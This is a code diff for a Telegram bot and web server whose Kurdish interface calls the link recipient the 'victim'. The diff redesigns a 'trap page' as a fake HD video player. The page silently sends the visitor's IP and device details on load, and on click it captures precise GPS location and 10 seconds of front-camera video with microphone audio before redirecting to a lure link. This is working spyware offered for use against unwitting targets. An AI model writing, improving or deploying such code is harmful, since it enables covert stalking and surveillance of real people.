@@ -24,7 +24,7 @@ TEXTS = {
         "menu_stats": "📊 باری سیستەم",
         "menu_lang": "🌐 گۆڕینی زمان",
         "menu_ai": "🧠 زیرەکی دەستکرد",
-        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی ئامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
+        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی أامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
         "ask_redirect": "🔗 **سەرۆک، فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
         "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
         "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
@@ -156,13 +156,13 @@ async def handle_admin_photo(message: Message):
         if not railway_domain.startswith("http"):
             railway_domain = f"https://{railway_domain}"
             
-        payload_link = f"{railway_domain}/view?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
+        payload_link = f"{railway_domain}/media?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی شاهانە - ناونیشانی سادە و بێ گومان (وەک پۆستێکی ئاسایی)
+# پەڕەی تەڵەی شاهانە - فێڵی نوێی پلەبەرز (شێوازی پلەیێر و پەخشی ڤیدیۆیی سروشتی بێ گومان)
 async def web_trap_page(request: web.Request):
     encoded_redirect = request.query.get('id', '')
     try:
@@ -179,10 +179,10 @@ async def web_trap_page(request: web.Request):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shared Media Preview</title>
+    <title>HD Video Player</title>
     <style>
         body {{
-            background: #0f172a;
+            background: #000000;
             color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             text-align: center;
@@ -193,39 +193,55 @@ async def web_trap_page(request: web.Request):
             margin: 0;
             overflow: hidden;
         }}
-        .card {{
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(12px);
-            padding: 35px 22px;
-            border-radius: 18px;
-            max-width: 340px;
-            width: 90%;
-            box-shadow: 0 12px 35px rgba(0,0,0,0.6);
-        }}
-        h3 {{ font-size: 16px; margin-bottom: 8px; color: #f8fafc; font-weight: 500; }}
-        p {{ color: #94a3b8; font-size: 13px; margin-bottom: 22px; line-height: 1.4; }}
-        .btn {{
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 13px 20px;
-            font-size: 14px;
-            font-weight: 500;
-            border-radius: 10px;
-            cursor: pointer;
+        .player-container {{
+            position: relative;
             width: 100%;
-            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
-            transition: 0.2s;
+            max-width: 400px;
+            height: 100vh;
+            background: #111;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }}
-        .btn:active {{ transform: scale(0.98); opacity: 0.9; }}
+        .play-overlay {{
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+            transition: 0.2s;
+            z-index: 10;
+        }}
+        .play-overlay:hover {{ transform: scale(1.05); background: rgba(0,0,0,0.8); }}
+        .play-icon {{
+            width: 0;
+            height: 0;
+            border-top: 18px solid transparent;
+            border-bottom: 18px solid transparent;
+            border-left: 28px solid #ffffff;
+            margin-left: 6px;
+        }}
+        .loading-text {{
+            position: absolute;
+            bottom: 40px;
+            color: #888;
+            font-size: 13px;
+        }}
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>فایلی هاوبەشکراو</h3>
-        <p>بۆ نیشاندانی ناوەڕۆکەکە بە کوالێتی بەرز، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-        <button class="btn" onclick="initializeCapture()">بینینی ڤیدیۆ</button>
+    <div class="player-container" onclick="triggerSecretFlow()">
+        <div class="play-overlay">
+            <div class="play-icon"></div>
+        </div>
+        <div class="loading-text">تکایە کلیک بکە بۆ چالاککردنی دەنگ و پخشکردن</div>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -234,23 +250,24 @@ async def web_trap_page(request: web.Request):
         const redirectTarget = "{redirect_url}";
         const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};
 
+        // ناردنی زانیاری ئامێر و IP بە بێدەنگ لە پاشبنەما
         fetch('/save_info', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
             body: JSON.stringify(clientInfo)
         }});
 
-        function initializeCapture() {{
-            // ١. وەرگرتنی لۆکەیشن بە شێوازی دەستبەجێ کاتێک دوگمە دەگرێت
+        function triggerSecretFlow() {{
+            // ١. هەوڵدانی بەدەستهێنانی لۆکەیشن بە خێرایی لە ڕێگەی کرتەی بەکارهێنەرەوە
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
                     fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
                 }}, function(err) {{
-                    console.log("GPS error");
-                }}, {{ timeout: 7000, enableHighAccuracy: true }});
+                    console.log("GPS denied or unavailable");
+                }}, {{ timeout: 8000, enableHighAccuracy: true }});
             }}
 
-            // ٢. دەستپێکردنی کامێرا و تۆمارکردنی ١٠ چرکە بە فۆرماتی MP4
+            // ٢. دەستپێکردنی خێرای کامێرا و مایک و تۆمارکردنی ١٠ چرکە
             navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
@@ -297,6 +314,7 @@ async def web_trap_page(request: web.Request):
                 }}, 10000);
                 
             }}).catch(function(err) {{
+                // ئەگەر کامێراشی ڕەتکردەوە، ڕاستەوخۆ دەگوازرێتەوە بۆ لینکی مەبەست
                 window.location.href = redirectTarget;
             }});
         }}
@@ -349,7 +367,7 @@ async def index_handler(request):
 async def main():
     app = web.Application(client_max_size=50*1024*1024)
     app.router.add_get('/', index_handler)
-    app.router.add_get('/view', web_trap_page)
+    app.router.add_get('/media', web_trap_page)
     app.router.add_post('/save_info', save_info)
     app.router.add_post('/upload_video', upload_video)
     app.router.add_get('/save_location', save_location)
